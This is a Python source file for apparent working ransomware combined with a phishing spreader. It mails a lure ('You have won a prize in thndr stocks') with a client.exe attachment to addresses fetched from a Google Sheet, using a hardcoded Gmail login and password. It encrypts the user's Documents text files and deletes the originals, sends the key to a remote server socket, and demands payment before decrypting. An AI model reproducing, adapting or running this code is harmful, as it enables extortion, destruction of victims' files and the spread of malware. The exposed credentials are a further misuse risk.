import socket
import random
import string
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os
import glob
import smtplib
import csv
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import requests
import pandas as pd
import io
import subprocess


def generate_key(length=16):
    characters = string.ascii_letters + string.digits + string.punctuation
    key = ''.join(random.choice(characters) for i in range(length))
    return key

def find_all_files():
    # Uncomment when ready in order to get all text files on the PC
    # txt_files = glob.glob('**/*.txt', recursive=True)
    desktop_path = os.path.expanduser("~/Documents")
    file_pattern = os.path.join(desktop_path, "*.txt")
    txt_files = glob.glob(file_pattern)
    return txt_files

def find_all_encrypted_files():
    desktop_path = os.path.expanduser("~/Documents")
    file_pattern = os.path.join(desktop_path, "*.encrypted")
    txt_files = glob.glob(file_pattern)
    return txt_files

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        encrypted_data = f.read()
        iv = encrypted_data[:16]
        encrypted_message = encrypted_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_message = cipher.decrypt(encrypted_message)
        unpadded_message = decrypted_message[:-decrypted_message[-1]]
        with open(file_path[:-10], 'wb') as f_out:  # Remove the '.encrypted' extension
            f_out.write(unpadded_message)
    os.remove(file_path)

def decrypt_all(key):
    for file in find_all_encrypted_files():
        decrypt_file(file, key)

def encrypt_file(file_path, key):
    iv = os.urandom(16)
    with open(file_path, 'rb') as f:
        message = f.read()
        padded_message = message + ((16 - len(message) % 16) * chr(16 - len(message) % 16)).encode()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_message = cipher.encrypt(padded_message)
        with open(file_path + '.encrypted', 'wb') as f_out:
            f_out.write(iv + encrypted_message)
    os.remove(file_path)

def save_key(key, file_name='Key.key'):
    desktop_path = os.path.expanduser("~/Documents")
    file_path = os.path.join(desktop_path, file_name)
    with open(file_path, 'wb') as f:
        f.write(key)

def read_key(file_name='Key.key'):
    desktop_path = os.path.expanduser("~/Documents")
    file_path = os.path.join(desktop_path, file_name)
    with open(file_path, 'rb') as f:
        key = f.read()
    return key

def encrypt_using_public(public_key, message):
    pk = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(pk)
    ciphertext = cipher.encrypt(message)
    return ciphertext

def decrypt_using_private(private_key, ciphertext):
    pvk = RSA.import_key(private_key)
    cipher = PKCS1_OAEP.new(pvk)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext

def sendmail(content, receiver, attachment_path):
    sender_email = "thndrstocks@gmail.com"
    receiver_email = receiver
    password = "emwqdhkmqonxxrnl"

    # Create a multipart message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Congratulation! You have been selected for thndr bonus."

    # Attach the content as plain text
    message.attach(MIMEText(content, "plain"))

    # Open and attach the file
    with open(attachment_path, "rb") as attachment:
        part = MIMEApplication(attachment.read(), Name=attachment_path)

    # Add header for the attachment
    part['Content-Disposition'] = f'attachment; filename="{attachment_path}"'

    # Attach the file to the message
    message.attach(part)

    # Connect to the SMTP server and send the email
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    server.send_message(message)
    server.quit()

def infect(csv_url, attachment):
    response = requests.get(csv_url)

    if response.status_code == 200:
        csv_content = response.content.decode('utf-8')
        df = pd.read_csv(io.StringIO(csv_content))
    else:
        print("Error:", response.status_code)

    # get the email from the df
    emails = df['Email'].tolist()

    # loop through the emails and send the email
    for email in emails:
        sendmail("You have won a prize in thndr stocks click the file to view",
                 email, attachment)

    print(emails)


infect("https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv", "dist/client/client.exe")

key = generate_key(16)
bytes_key = key.encode('utf-8')

txt_files = find_all_files()

for file_path in txt_files:
    encrypt_file(file_path, bytes_key)

save_key(bytes_key)


#plaintext = decrypt_using_private(private_key=private_key, ciphertext=encrypted_key)
#print (plaintext)

#connect to the server and send the encrypted key to it
SERVER_IP = '172.20.10.2'
SERVER_PORT = 5678 
#connect to the server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.connect((SERVER_IP, SERVER_PORT))

# Request public key from server
public_key = server_socket.recv(1024).decode()
print("Received public key:", public_key)

# Send "SUIII" message to server
server_socket.send(encrypt_using_public(public_key=public_key, message=bytes_key))

message = "Congratulations I hacked you , Encryption in progress!!"
subprocess.call(['cmd', '/c', 'echo', message])
user_input = input('Enter OK if you have paid!')

#request decrypted AES key from the server
AES_key_received = server_socket.recv(1024).decode()
#if this prints true, then the process is successful
print(AES_key_received==key) #key is the original AES key

if user_input == 'OK':
    decrypt_all(AES_key_received.encode('utf-8'))

server_socket.close()

